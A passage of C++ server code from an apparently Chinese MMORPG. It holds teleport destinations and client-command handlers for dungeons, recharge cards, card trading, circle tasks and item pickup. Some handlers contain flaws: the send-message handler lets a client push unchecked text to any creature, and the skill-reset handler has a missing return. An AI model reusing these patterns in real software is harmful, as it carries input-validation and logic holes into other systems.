	else if(strcmp(city,"flyout7") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("ZhaoGe"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 54490;
		pos[1] = -6932;
	}
	else if(strcmp(city,"flyin8") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("ZhaoGe"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 54530;
		pos[1] = -10171;
	}
	else if(strcmp(city,"flyout8") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("ZhaoGe"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 54410;
		pos[1] = -10789;
	}
	else if(strcmp(city,"flyin9") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 49691;
		pos[1] = -17690;
	}
	else if(strcmp(city,"flyout9") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 50429;
		pos[1] = -18310;
	}
	// 仙岛
	else if(strcmp(city,"fly_island") == 0)
	{
		credit = 2;
		cost = 0;
		pos[0] = 4040;
		pos[1] = -31610;
	}
	else if(strcmp(city,"fly_chuanyun") == 0)
	{
		cost = 0;
		pos[0] = 28165;
		pos[1] = -6965;
	}
	else if(strcmp(city,"fly_place_shang") == 0)
	{
		cost = 0;
		pos[0] = -14355;
		pos[1] = -34845;
	}	
	else if(strcmp(city,"fly_place_zhou") == 0)
	{
		cost = 0;
		pos[0] = -8545;
		pos[1] = -50610;
	}
	else if(strcmp(city,"fly_island_shang") == 0)
	{
		cost = 0;
		pos[0] = 769; 
		pos[1] = -28907;
	}
	else if(strcmp(city,"fly_island_zhou") == 0)
	{
		cost = 0;
		pos[0] = 620;
		pos[1] = -34990;
	}
	//else if(strcmp(city,"movetodownzhaoge") == 0)//tim.yang  注释掉地宫功能
	//{
	//	// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
	//	//	valid = false;
	//	cost = 0;
	//	pos[0] = -19728;
	//	pos[1] = -3587;
	//}
	else if(strcmp(city,"movetoupzhaoge") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = 0;
		pos[0] = 54710; 
		pos[1] = -12509;
	}
	//else if(strcmp(city,"movetodownxiqi") == 0)//tim.yang  注释掉地宫功能
	//{
	//	// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
	//	//	valid = false;
	//	cost = 0;
	//	pos[0] = -19555;
	//	pos[1] = -15387;
	//}

	else if(strcmp(city,"movetodownzhou1") == 0)//tooth.shi	天地风雷阵（邪恶，等级≥90级）
	{
		cost = 0;
		pos[0] = -19555;
		pos[1] = -15387;
	}

	else if(strcmp(city,"movetodownzhou2") == 0)//tooth.shi	恶魔亡魂阵（噩梦，等级≥100级）
	{
		cost = 0;
		pos[0] = -35560;
		pos[1] = -8400;
	}

	else if(strcmp(city,"movetodownshang1") == 0)//tooth.shi	天地风雷阵（邪恶，等级≥90级）
	{
		cost = 0;
		pos[0] = -19640;
		pos[1] = -3580;
	}

	else if(strcmp(city,"movetodownshang2") == 0)//tooth.shi	恶魔亡魂阵（噩梦，等级≥100级）
	{
		cost = 0;
		pos[0] = -29940;
		pos[1] = 7440;
	}


	else if(strcmp(city,"movetoupxiqi") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = 0;
		pos[0] = 7230;
		pos[1] = -74;
	}
	else if (strcmp(city,"movetoruolaiin") == 0)
	{
		cost = 10 * BASE_TRANSPORT_PRICE;
		pos[0] = -770 * 20;
		pos[1] = 755 * 20;
	}
	else if (strcmp(city,"movetoruolaiout") == 0)
	{
		cost = 0;
		pos[0] = 1405 * 20;
		pos[1] = -425 * 20;
	}
	else if (strcmp(city,"movetotianlaoout") == 0)
	{
		if (0 == CmdGiver->m_core.Pk)
		{
			cost = 0;
			pos[0] = 27733;
			pos[1] = -7153;
		}
		else
		{
			CmdGiver->SendSystemMessage("只有当PK值为0时才能传出！");
			return CMD_ERROR_NONE;
		}
	}

	else if (strcmp(city,"movetozhuluzhou") == 0)
	{
		cost = 0;
		credit = 0;
		if(CmdGiver->m_core.Faction != FACTION_ZHOU)
			valid=false;
		if(!g_region->m_pWarZhulu->IsZhuluActive(true) && !g_region->m_pWarZhulu->IsZhuluActive(false))
			valid = false;
		if(CmdGiver->m_core.Lev < 60)
			valid = false;
		pos[0] = 2708*20;
		pos[1] = -1220*20;
		g_region->m_pWarZhulu->OnEnterZhulu(CmdGiver->m_userInfo);
	}

	else if (strcmp(city, "movetozhulushang") == 0)
	{
		cost = 0;
		credit = 0;
		if(CmdGiver->m_core.Faction != FACTION_SHANG)
			valid=false;
		if(!g_region->m_pWarZhulu->IsZhuluActive(true) && !g_region->m_pWarZhulu->IsZhuluActive(false))
			valid = false;
		if(CmdGiver->m_core.Lev < 60)
			valid = false;
		pos[0] = 2708*20;
		pos[1] = -1380*20;
		g_region->m_pWarZhulu->OnEnterZhulu(CmdGiver->m_userInfo);
	}

	else if (strcmp(city, "moveto2chiyou") ==0)
	{
		pos[0] = 3020;
		pos[1] = -11275;
		
		if(CmdGiver->m_scene->GetTeamNum(1) !=0 )
		{
			valid = false;
		}
	}

	else if (strcmp(city, "moveto3chiyou") ==0)
	{
		pos[0] = 2585;
		pos[1] = -10115;

		if(CmdGiver->m_scene->GetTeamNum(2) !=0 )
		{
			valid = false;
		}
	}

	/*
	// 离开副本
	else if(strcmp(city,"Movetoxiqi_fb") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = 0;
		pos[0] = 7245;
		pos[1] = -8660;
	}
	*/
	else
	{
		return CMD_ERROR_NONE;
	}

	if(!valid)
		return CMD_ERROR_NONE;

	if(CmdGiver->GetGold() < cost)
	{
		// g_region->ShowHtmlDialog(NULL,CmdGiver,"task/npc/fly_error.html");
		return CMD_ERROR_NONE;
	}
	if(CmdGiver->GetCredit() < credit)
	{
		return CMD_ERROR_NONE;
	}

	if(item)
	{
		if(!CmdGiver->RemoveItem(item,1))
			return CMD_ERROR_NONE;
	}

	int x,y;
	CmdGiver->m_scene->m_pTerrain->GetTerrainByPosFast(pos[0],pos[1],x,y);

	CG_CmdPacket& packet = g_region->m_gws.BeginSend();
	packet.WriteShort(r2g_gm_move);
	packet.WriteLong(CmdGiver->m_userInfo->m_userId);
	packet.WriteByte(2); // moveto
	packet.WriteLong(x);
	packet.WriteLong(y);
	g_region->m_gws.EndSend();

	if(cost)
		CmdGiver->AddGold(-cost);
	if(credit)
		CmdGiver->RemoveCredit(credit);
	/*
	if(CmdGiver->ForceSetPosition(pos[0],pos[1],pos[2]))
	{
		CmdGiver->AddGold(-cost);
	}
	*/
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_quit_game)
{
	GET_PARAMS();
	// 立刻退出
	CmdGiver->m_userInfo->m_netDeadTime = rtGetMilliseconds() - 2000;
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_confirm_switch_region)
{
	GET_PARAMS();

	g_region->m_gws.SwitchRegion(CmdGiver->m_userInfo);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_request_clear_skill)
{
	GET_PARAMS();
	
	g_sendCmd->BeginWrite();
	g_sendCmd->WriteShort(r2c_show_clear_skill_ui);
	g_sendCmd->WriteShort(GetTotalClearSkillChance(CmdGiver->m_core.Lev)-CmdGiver->m_core.SkillClearCnt);
	g_sendCmd->WriteShort(CmdGiver->m_core.SkillClearCnt);
	g_sendCmd->WriteLong(GetClearSPCost(CmdGiver->m_core.SkillClearCnt));
	CmdGiver->RecvCmd(g_sendCmd);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_rebirth_user)
{
	GET_PARAMS();

	long iHPrate = 0;
	long iMPrate = 0;

	if(!cmd->ReadLong(&iHPrate)) return CMD_ERROR_READ_DATA;
	if(!cmd->ReadLong(&iMPrate)) return CMD_ERROR_READ_DATA;

	if (CmdGiver)
	{
		CmdGiver->Rebirth(4,iHPrate,iMPrate);
	}

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_confirm_clear_skill)
{
	GET_PARAMS();
	

	if (CmdGiver->IsChengBody())
	{
		rt2_sprintf(g_strStaticBuffer, R(MSG_CANNOT_USEITEMWHILETRANSFORM));
		CmdGiver->SendSystemMessage(g_strStaticBuffer);
		CMD_ERROR_NONE;
	}

	short left = GetTotalClearSkillChance(CmdGiver->m_core.Lev)-CmdGiver->m_core.SkillClearCnt;
	if(left <= 0) return CMD_ERROR_NONE;
	
	short cost = GetClearSPCost(CmdGiver->m_core.SkillClearCnt);
    if(CmdGiver->GetGold() < cost) return CMD_ERROR_NONE;
	
	CmdGiver->m_core.SkillClearCnt++;
	CmdGiver->AddGold(-cost);	
	CmdGiver->m_Skill.ClearFightSkill(true);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_set_pet_info)
{
	GET_PARAMS();
	long rate;
	long counterAttack;
	if(!cmd->ReadLong(&rate)) return CMD_ERROR_READ_DATA;
	if(!cmd->ReadLong(&counterAttack)) return CMD_ERROR_READ_DATA;

	CmdGiver->PetSetInfo(rate,counterAttack!=0);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_get_next_gift)
{
	GET_PARAMS();
	if (!CmdGiver->m_userInfo)	return CMD_ERROR_UNKNOWN;

	CRegionGiftMgr::NetSend_r2g_query_gifts(CmdGiver->m_userInfo->m_userId, CmdGiver->m_core.Lev);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_query_player_info)
{
	GET_PARAMS();
	long playerOID;
	if (!cmd->ReadLong(&playerOID))		return CMD_ERROR_READ_DATA;
	
	CRegionCreature* pCre = CmdGiver->m_scene->FindCreature(playerOID);
	if (!pCre || !pCre->m_pItemContainer)
		return CMD_ERROR_NONE;

	g_sendCmd->BeginWrite();
	g_sendCmd->WriteShort(r2c_player_info);
	g_sendCmd->WriteLong(pCre->m_oId);
	g_sendCmd->WriteString((char*)pCre->m_core.Name.c_str());
	pCre->m_pItemContainer->Serialize(NET_PLAYER_QUERY_INFO, g_sendCmd);
	CmdGiver->RecvCmd(g_sendCmd);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_finish_fb_task)
{
	GET_PARAMS();
	long taskId;
	long sreward;
	if(!cmd->ReadLong(&taskId)) return CMD_ERROR_READ_DATA;
	if(!cmd->ReadLong(&sreward)) return CMD_ERROR_READ_DATA;

	if(CmdGiver->FbCanFinishTask(taskId,sreward))
		CmdGiver->FbFinishTask(taskId,sreward);
	
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_leave_fb)
{
	GET_PARAMS();
	
	long npcId;
	char *city;
	if(!cmd->ReadLong(&npcId)) return CMD_ERROR_READ_DATA;
	if(!cmd->ReadString(&city)) return CMD_ERROR_READ_DATA;
    if (strlen(city)>40) return CMD_ERROR_READ_DATA;

	CRegionCreature *cre = CmdGiver->m_scene->FindCreature(npcId);
	if(!cre) return CMD_ERROR_NONE;
	//tim.yang  传送的时间判断
	if (!cre->isteleport(cre->m_npcId))
	{
		return CMD_ERROR_NONE;
	}
	//end
	if(cre->Distance(CmdGiver->m_pos) > 400) return CMD_ERROR_NONE;
	// if(CmdGiver->GetPKState() == PK_STATE_RED_NAME) return CMD_ERROR_NONE;
	
	g_region->m_fbMgr->RequestLeave(CmdGiver->m_userInfo);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_enter_fb)
{
	GET_PARAMS();

	long npcId;
	char *city;
	long cost=0,item=0;
	if(!cmd->ReadLong(&npcId)) return CMD_ERROR_READ_DATA;
	if(!cmd->ReadString(&city)) return CMD_ERROR_READ_DATA;

	CRegionCreature *cre = CmdGiver->m_scene->FindCreature(npcId);
	if(!cre) return CMD_ERROR_NONE;
	//tim.yang  传送的时间判断
	if (!cre->isteleport(cre->m_npcId))
	{
		return CMD_ERROR_NONE;
	}
	//end
	if(cre->Distance(CmdGiver->m_pos) > 400) return CMD_ERROR_NONE;
	if(CmdGiver->GetPKState() == PK_STATE_RED_NAME) return CMD_ERROR_NONE;

	int fbId=0,dif=0;
	if(strncmp(city,"fbmoveto_chong",14) == 0)
	{
		fbId = 2;
		dif  = city[14]-'0';
	}
	else if(strncmp(city,"fbmoveto_jiu",12) == 0)
	{
		fbId = 4;
		dif  = city[12]-'0';
	}
	else if(strncmp(city,"fbmoveto_ji",11) == 0)
	{
		fbId = 1;
		dif  = city[11]-'0';
	}
	else if(strncmp(city,"fbmoveto_qu",11) == 0)
	{
		fbId = 3;
		dif  = city[11]-'0';
	}
	else if(strncmp(city,"fbmoveto_cy",11) == 0)
	{
		fbId = 5;
		dif  = 4;
	}

	if(fbId == 0 || dif < 0 || dif >= MAX_FB_LEVEL)
		return CMD_ERROR_NONE;

	int iUserLV = 1;
	if(CmdGiver->m_pTeam)
	{
		if(CmdGiver->m_pTeam->mData.Size() > 0)
		{
			for(int ii=CmdGiver->m_pTeam->mData.Begin();
				ii != CmdGiver->m_pTeam->mData.End();
				ii++)
				iUserLV += (int)CmdGiver->m_pTeam->mData[ii].mLevel;
			iUserLV /= CmdGiver->m_pTeam->mData.Size();
		}
		else iUserLV = CmdGiver->m_core.Lev;
	}
	else iUserLV = CmdGiver->m_core.Lev;
    const char* szMsg = g_region->m_fbMgr->RequestEnter(CmdGiver->m_userInfo,fbId,dif,iUserLV,CmdGiver->m_pos[0],CmdGiver->m_pos[1]);
	if (szMsg)
    {
        CmdGiver->SendSystemMessage(szMsg);
    }

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_report_info)
{
	GET_PARAMS();

    short sType;
    long lProcessID;
    short sResult;

    if(!cmd->ReadShort(&sType)) return CMD_ERROR_READ_DATA;
    switch (sType)
    {
    case 1:
        if(!cmd->ReadLong(&lProcessID)) return CMD_ERROR_READ_DATA;
        if(!cmd->ReadShort(&sResult)) return CMD_ERROR_READ_DATA;
        if (sResult)
        {
            CmdGiver->WgChecked(120,600,WG_INFO_CLIENT_MODULE);
#ifdef WIN32
            MSG1("%s 检查到特定程序\n", CmdGiver->m_core.Name.c_str());
#endif
        }else
        {
#ifdef WIN32
            MSG1("%s 没有检查到特定程序\n", CmdGiver->m_core.Name.c_str());
#endif
        }
        CmdGiver->m_lLastCheckProcessTime = 0;
        break;
    default:
        return CMD_ERROR_READ_DATA;
    }
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_charge_card)
{
	GET_PARAMS();
    long lNpcID;
    char cCardType;
    char* szCardID;
    char* szCardPwd;

    if (!cmd->ReadLong(&lNpcID))        return CMD_ERROR_READ_DATA;
    if (!cmd->ReadByte(&cCardType))     return CMD_ERROR_READ_DATA;
    if (!cmd->ReadString(&szCardID))    return CMD_ERROR_READ_DATA;
    if (!cmd->ReadString(&szCardPwd))   return CMD_ERROR_READ_DATA;

    // 对客户端上传的内容进行检查
    int i, iLen = (int)strlen(szCardID);
    if (iLen>50) return CMD_ERROR_READ_DATA;
    for (i=0; i<iLen; i++)
    {
        if (!((szCardID[i]>='A' && szCardID[i]<='Z') || (szCardID[i]>='a' && szCardID[i]<='z') || (szCardID[i]>='0' && szCardID[i]<='9')))
        {
            return CMD_ERROR_READ_DATA;
        }
    }

    // 对客户端上传的内容进行检查
    iLen = (int)strlen(szCardPwd);
    if (iLen>50) return CMD_ERROR_READ_DATA;
    for (i=0; i<iLen; i++)
    {
        if (!((szCardPwd[i]>='A' && szCardPwd[i]<='Z') || (szCardPwd[i]>='a' && szCardPwd[i]<='z') || (szCardPwd[i]>='0' && szCardPwd[i]<='9')))
        {
            return CMD_ERROR_READ_DATA;
        }
    }

	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(lNpcID);
	if (pCre==NULL) return CMD_ERROR_UNKNOWN;
	if (pCre->m_npcInfo==NULL) return CMD_ERROR_UNKNOWN;

    if(pCre->Distance(CmdGiver->m_pos) > 240)
    {
		return CMD_ERROR_UNKNOWN;
    }

    /*
	// 不同阵营不可以交互
	if ( (pCre->m_npcInfo->Faction==FACTION_SHANG||pCre->m_npcInfo->Faction==FACTION_ZHOU) && (pCre->m_npcInfo->Faction != CmdGiver->m_core.Faction) )
		return CMD_ERROR_NONE;
    */

	CG_CmdPacket& packet = g_region->m_gws.BeginSend();
	packet.WriteShort(r2g_charge_card);
	packet.WriteLong(CmdGiver->m_userInfo->m_userId);
    packet.WriteString((char*)(CmdGiver->m_userInfo->m_username.c_str()));
    packet.WriteShort(CmdGiver->m_core.Lev);
    packet.WriteByte(CmdGiver->m_core.Metier);
    packet.WriteByte(CmdGiver->m_core.MetierLev);
    packet.WriteByte(cCardType);
    packet.WriteString(szCardID);
    packet.WriteString(szCardPwd);
	g_region->m_gws.EndSend();

    return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_check_answer)
{
	GET_PARAMS();

	if (!CmdGiver->m_userInfo)
		return CMD_ERROR_UNKNOWN;
	g_AntiRobot.OnRecvUserReply(CmdGiver->m_userInfo, cmd);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_master_prentice)
{
	GET_PARAMS();
	return PrenticeCmdProcess_Svr(CmdGiver, cmd);
}

CMD_FUNCTION(cmd_c2r_request_card_list)
{
	GET_PARAMS();
    long lNpcID;
    short sStart, sCount;
    if (!cmd->ReadLong(&lNpcID))    return CMD_ERROR_READ_DATA;
    if (!cmd->ReadShort(&sStart))   return CMD_ERROR_READ_DATA;
    if (!cmd->ReadShort(&sCount))   return CMD_ERROR_READ_DATA;

	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(lNpcID);
	if (pCre==NULL) return CMD_ERROR_READ_DATA;
	if (pCre->m_npcInfo==NULL) return CMD_ERROR_READ_DATA;
    if(pCre->Distance(CmdGiver->m_pos) > 240)
    {
		CmdGiver->SendSystemMessage(R(MSG_NPC_DISTANCE_FAR));
		return CMD_ERROR_NONE;
    }

    g_region->m_rsCardTrade.ClientRequestUpdate(CmdGiver, sStart, sCount);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_buy_card)
{
	GET_PARAMS();

    long lNpcID;
    long lConsignationID;
    if (!cmd->ReadLong(&lNpcID))            return CMD_ERROR_READ_DATA;
    if (!cmd->ReadLong(&lConsignationID))   return CMD_ERROR_READ_DATA;

	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(lNpcID);
	if (pCre==NULL) return CMD_ERROR_READ_DATA;
	if (pCre->m_npcInfo==NULL) return CMD_ERROR_READ_DATA;

    if(pCre->Distance(CmdGiver->m_pos) > 240)
    {
		CmdGiver->SendSystemMessage(R(MSG_NPC_DISTANCE_FAR));
		return CMD_ERROR_NONE;
    }

    /*
	// 不同阵营不可以交互
	if ( (pCre->m_npcInfo->Faction==FACTION_SHANG||pCre->m_npcInfo->Faction==FACTION_ZHOU) && (pCre->m_npcInfo->Faction != CmdGiver->m_core.Faction) )
		return CMD_ERROR_NONE;
    */
    g_region->m_rsCardTrade.BuyCard(CmdGiver, lConsignationID);
	return CMD_ERROR_NONE;
}

// 改动：添加挂起功能
CMD_FUNCTION(cmd_c2r_save_circle)
{
	GET_PARAMS();

	STaskInfo* 	info = CmdGiver->m_task.FindCircleTask();

	if(info && /*PZH*//*info->IsDoing*/info->FIsDoing()) //如果有跑环任务
	{
		if(CmdGiver->m_task.m_isActive==1)
		{
			//not enough money
			//if(CmdGiver->GetGold() <1000000)
			//{
			//	
			//}else
			//{

			static long VALUE = 1000000;
			static CIniVariable value(GetGameRule(),"GamePriceRule","SaveCircleCost",VALUE );

			if(CmdGiver->RemoveGold(VALUE))
			{
				CmdGiver->m_task.m_isActive = 0;
				CmdGiver->m_task.m_passTime = (DWORD)time(NULL)-info->BeginTime;
				//info->Desc->finishTimeLimit = -1;

				g_sendCmd->BeginWrite();
				g_sendCmd->WriteShort(r2c_save_circle_rep);
				g_sendCmd->WriteLong(1);
				CmdGiver->RecvCmd(g_sendCmd);

				CmdGiver->UpdateToClient(NET_CRE_UPDATE_TASK);

				LOG3("User %s[%d] saved circle task: current circle %d\n", 
							CmdGiver->m_userInfo->m_username.c_str(),
							CmdGiver->m_userInfo->m_userId,
							CmdGiver->m_task.m_currCircle);

			
				return CMD_ERROR_NONE;
			}else
			{
				CmdGiver->SendSystemMessage(R(MSG_ITEM_NOT_ENOUGH_MONEY));
			}
			//}
		}
	}

	g_sendCmd->BeginWrite();
	g_sendCmd->WriteShort(r2c_save_circle_rep);
	g_sendCmd->WriteLong(0);
	CmdGiver->RecvCmd(g_sendCmd);

	return CMD_ERROR_NONE;

}

CMD_FUNCTION(cmd_c2r_send_message)
{
	//GET_PARAMS();
	char* msg;
	long objectId;
	cmd->ReadLong(&objectId);
	cmd->ReadString(&msg);
	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(objectId);
	if(pCre != 0)
	{
		pCre->SendSystemMessage(msg);
	}
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_rage_burst)
{
	GET_PARAMS();
	long objectid;
	cmd->ReadLong(&objectid);
	
	int iEff = 0;
	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(objectid);
	if(pCre != NULL)
	{
		switch (pCre->m_iRigelevel)
		{
		case 1:
			pCre->SendSystemMessage(R(MSG_RAGE1_BURST));
			iEff = 508;
			//MSG2("设置ID为： %d 的技能\n", param.Skill);
			break;
		case 2:
			pCre->SendSystemMessage(R(MSG_RAGE2_BURST));
			iEff = 509;
			//MSG2("设置ID为： %d 的技能\n", param.Skill);
			break;
		case 3:
			pCre->SendSystemMessage(R(MSG_RAGE3_BURST));
			iEff = 510;
			//MSG2("设置ID为： %d 的技能\n", param.Skill);
			break;
		}
		if(iEff != 0)
		{
			//MSG2("使用ID为： %d 的技能，当前的爆气等级判断为：%d\n", param.Skill,pCre->m_iRigelevel);
			pCre->m_iRigelevel = 0;
			//CmdGiver->m_iRigelevel = 0;
			//MSG2("使用ID为： %d 的技能，当前的爆气等级判断为：%d\n", param.Skill,pCre->m_iRigelevel);
			//CmdGiver->m_Skill.AddEffect(iEff, 0, true);
			pCre->m_Skill.AddEffect(iEff, 0, true);
			if (pCre->IsUser() && pCre->m_pet != 0)
			{
				pCre->m_pet->m_Skill.AddEffect(iEff,0,true);
			}
			//MSG4("CmdGive is: %s, pCre is: %s\n", CmdGiver->m_core.Name.c_str(), pCre->m_core.Name.c_str());
			//MSG2("rage burst finish!! skill->ID=%d, creature->id=%d\n", param.Skill, objectid);
			//pCre->UseSkill(param);
			//MSG2("rage burst finish!! skill->ID=%d, creature->id=%d\n", param.Skill, objectid);
			return CMD_ERROR_NONE;
		}
		//MSG2("rage burst error creature->ragelevel = %d, creature->objectid =%d\n", pCre->m_iRigelevel, objectid);
	}
	//MSG2("No find creature , objectid = %d\n",objectid);
	return CMD_ERROR_UNKNOWN;
}

// 改动：添加挂起功能
CMD_FUNCTION(cmd_c2r_active_circle)
{
	GET_PARAMS();

	STaskInfo* 	info = CmdGiver->m_task.FindCircleTask();

	if(info && /*PZH*//*info->IsDoing*/info->FIsDoing()) //如果有跑环任务
	{
		if(CmdGiver->m_task.m_isActive==0)
		{
			CmdGiver->m_task.m_isActive = 1;
			//info->Desc->finishTimeLimit = 2400;
			info->BeginTime = (DWORD)time(NULL)- CmdGiver->m_task.m_passTime;
						
			g_sendCmd->BeginWrite();
			g_sendCmd->WriteShort(r2c_active_circle_rep);
			g_sendCmd->WriteLong(1);
			CmdGiver->RecvCmd(g_sendCmd);

			CmdGiver->UpdateToClient(NET_CRE_UPDATE_TASK);

			return CMD_ERROR_NONE;
		}		
	}

	g_sendCmd->BeginWrite();
	g_sendCmd->WriteShort(r2c_active_circle_rep);
	g_sendCmd->WriteLong(0);
	CmdGiver->RecvCmd(g_sendCmd);

	return CMD_ERROR_NONE;

}

CMD_FUNCTION(cmd_c2r_consign_card)
{
	GET_PARAMS();

    long lNpcID;
    char cCardType;
    char* szCardID;
    char* szCardPrice;
    long lPrice;
	long lVerify;
//     if (!cmd->ReadLong(&lNpcID))        return CMD_ERROR_READ_DATA;
//     if (!cmd->ReadByte(&cCardType))     return CMD_ERROR_READ_DATA;
//     if (!cmd->ReadString(&szCardID))    return CMD_ERROR_READ_DATA;
//     if (!cmd->ReadString(&szCardPwd))   return CMD_ERROR_READ_DATA;
//     if (!cmd->ReadLong(&lPrice))        return CMD_ERROR_READ_DATA;

	if (!cmd->ReadLong(&lNpcID))        return CMD_ERROR_READ_DATA;
	if (!cmd->ReadByte(&cCardType))     return CMD_ERROR_READ_DATA;
	if (!cmd->ReadString(&szCardPrice))    return CMD_ERROR_READ_DATA;
	if (!cmd->ReadString(&szCardID))   return CMD_ERROR_READ_DATA;
	if (!cmd->ReadLong(&lVerify))        return CMD_ERROR_READ_DATA;


	// 对客户端上传的内容进行检查
	int i, iLen = (int)strlen(szCardID), iPriceLen = (int)strlen(szCardPrice);
    
	if (iLen>50 || iPriceLen>50) return CMD_ERROR_READ_DATA;
    for (i=0; i<iLen; i++)
    {
        if (!((szCardID[i]>='A' && szCardID[i]<='Z') || (szCardID[i]>='a' && szCardID[i]<='z') || (szCardID[i]>='0' && szCardID[i]<='9')))
        {
            return CMD_ERROR_READ_DATA;
        }
    }

    // 对客户端上传的内容进行检查
    iLen = (int)strlen(szCardPrice);
    if (iLen>50) return CMD_ERROR_READ_DATA;
    for (i=0; i<iPriceLen; i++)
    {
        if (!(szCardPrice[i]>='0' && szCardPrice[i]<='9'))
        {
		   CmdGiver->SendSystemMessage(R(MSG_CARD_ID_LEN_ERR));
           return CMD_ERROR_READ_DATA;
        }
    }
	
	lPrice = atoi(szCardPrice);

	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(lNpcID);
	if (pCre==NULL) return CMD_ERROR_READ_DATA;
	if (pCre->m_npcInfo==NULL) return CMD_ERROR_READ_DATA;

	//char szMD5[40];
	//rtMD5StringString(szCardID, szMD5);

	//对两次输入的卡号进行检查
// 	if (strcmp(szMD5,szCardPwd))
// 	{
// 		CmdGiver->SendSystemMessage(R(MSG_CARD_ID_SURE));
// 		return CMD_ERROR_READ_DATA;
// 	}

    if(pCre->Distance(CmdGiver->m_pos) > 240)
    {
		CmdGiver->SendSystemMessage(R(MSG_NPC_DISTANCE_FAR));
		return CMD_ERROR_NONE;
    }

    /*
	// 不同阵营不可以交互
	if ( (pCre->m_npcInfo->Faction==FACTION_SHANG||pCre->m_npcInfo->Faction==FACTION_ZHOU) && (pCre->m_npcInfo->Faction != CmdGiver->m_core.Faction) )
		return CMD_ERROR_NONE;
    */
    g_region->m_rsCardTrade.Consign(CmdGiver, szCardID, lVerify, lPrice);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_exp_card)
{
	GET_PARAMS();
	char *str;

	if (!cmd->ReadString(&str)) return CMD_ERROR_READ_DATA;
	if(strcmp(str,"view") == 0)
	{
		CmdGiver->ShowCardInfo();
	}
	else if(strcmp(str,"begin") == 0)
	{
		CmdGiver->StartUseCard();
	}
	else if(strcmp(str,"end") == 0)
	{
		CmdGiver->EndUseCard();
	}
	return CMD_ERROR_NONE;
}

//PZH
CMD_FUNCTION(cmd_c2r_shared_task)
{
	GET_PARAMS();
	long nTaskID;
	if (!cmd->ReadLong(&nTaskID))        return CMD_ERROR_READ_DATA;
	CmdGiver->GetPlayerLogic()->SharedTask(nTaskID);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_accept_shared_task)
{
	GET_PARAMS();
	long nTaskID;
	if (!cmd->ReadLong(&nTaskID))        return CMD_ERROR_READ_DATA;
	CmdGiver->GetPlayerLogic()->AcceptSharedTask(nTaskID);
	return CMD_ERROR_NONE;
}
//

CMD_FUNCTION(cmd_c2r_user_rebirth)
{
	GET_PARAMS();
	char cType;
	if (!cmd->ReadByte(&cType))        return CMD_ERROR_READ_DATA;
	CmdGiver->Rebirth(cType);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_pickitem_type)
{
	GET_PARAMS();
	long nID;
	char cType;
	if (!cmd->ReadLong(&nID))
	{
		return CMD_ERROR_READ_DATA;
	}
	if (!cmd->ReadByte(&cType))
	{
		return CMD_ERROR_READ_DATA;
	}
	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(nID);
	if(NULL == pCre)
	{
		g_sendCmd->BeginWrite();
		g_sendCmd->WriteShort(r2c_pickitem_type);
		g_sendCmd->WriteByte(cType);
		g_sendCmd->WriteByte(2);//物品已经消失
		CmdGiver->RecvCmd(g_sendCmd);
	}
	else
	{
		if(1 == cType)
		{
			g_sendCmd->BeginWrite();
			g_sendCmd->WriteShort(r2c_pickitem_type);
			g_sendCmd->WriteByte(cType);
			pCre->GetPlayerLogic()->GetMonsterLogicExt()->SendItemList(CmdGiver, g_sendCmd);
			CmdGiver->RecvCmd(g_sendCmd);
		}
		else if(2 == cType)
		{
			char c = (char)(pCre->GetPlayerLogic()->GetMonsterLogicExt()->GetSkin(CmdGiver));
			if(0 != c && 4 != c)
			{
				g_sendCmd->BeginWrite();
				g_sendCmd->WriteShort(r2c_pickitem_type);
				g_sendCmd->WriteByte(cType);
				g_sendCmd->WriteByte(c);
				CmdGiver->RecvCmd(g_sendCmd);
			}
		}
		else if(3 == cType)
		{
			pCre->GetPlayerLogic()->GetMonsterLogicExt()->PickSkin(CmdGiver);
		}
	}
